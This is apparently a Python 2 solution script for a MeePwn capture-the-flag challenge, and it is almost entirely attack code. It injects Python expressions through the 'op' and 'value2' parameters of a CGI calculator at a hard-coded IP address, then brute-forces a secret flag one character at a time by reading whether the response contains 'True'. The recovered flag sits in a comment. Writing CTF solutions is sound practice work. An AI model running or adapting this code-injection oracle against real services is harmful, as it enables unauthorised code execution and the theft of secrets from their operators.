import requests, string, urllib

url = "http://206.189.223.3/cgi-bin/server.py?"
template = "source={}value1={}&op={}&value2={}"

#flag = "MeePwnCTF{python3.66666666666666_([_((you_passed_this?]]]]]])}"
flag = "MeePwnCTF{"
while True:
	for i in string.printable:
		temp = {"value1":"asdf", "op":"+'", "value2" : """ == source or source in FLAG#"""}
		temp["source"] = flag + i
		temp = url + urllib.urlencode(temp)
		print temp
		res = requests.get(temp).text
		if "True" in res:
			flag += i
			break
	print flag
